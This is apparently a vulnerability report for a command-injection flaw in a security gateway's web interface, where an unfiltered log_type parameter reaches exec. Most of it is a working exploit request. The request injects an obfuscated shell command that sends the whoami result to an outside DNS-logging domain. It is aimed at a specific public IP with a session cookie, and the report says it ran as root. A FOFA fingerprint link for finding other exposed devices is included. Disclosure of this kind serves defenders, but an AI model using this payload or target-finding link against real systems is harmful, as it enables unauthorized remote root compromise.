In `webui/modules/log/fw_security.mds` after accepting the log_type parameter, without any filtering, it is directly spliced into the $table variable, and passed into exec, resulting in code execution.
![image](https://github.com/night-0p/anh/assets/54882616/d22c2473-c774-4232-b709-513dd3f40d31)
test steps:   
1，First obtain a dnslog domain name  through https://dig.pm/   
2，send exp:   
```
GET /webui/?g=log_fw_export&log_type=%26/bin/?ing${IFS}`whoami`.aad9181f4b.ipv6.1433.eu.org. HTTP/1.1
Host: 202.60.226.161
Cookie: USGSESSID=97ee993147299f7a38dab171b08fed44
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```
The following is the result of executing whoami. root authority.
<img width="1374" alt="image" src="https://github.com/night-0p/anh/assets/54882616/0d1d269d-3224-4dc8-9c7f-d8d9c6290305">
this Website fingerprinting:
https://fofa.info/result?qbase64=YXBwPSLlronmgZLkv6Hmga8t5piO5b6h5a6J5YWo572R5YWzIg%3D%3D this version:
<img width="872" alt="image" src="https://github.com/night-0p/anh/assets/54882616/1f7091b4-b4b9-415e-982a-60e07b219f82">

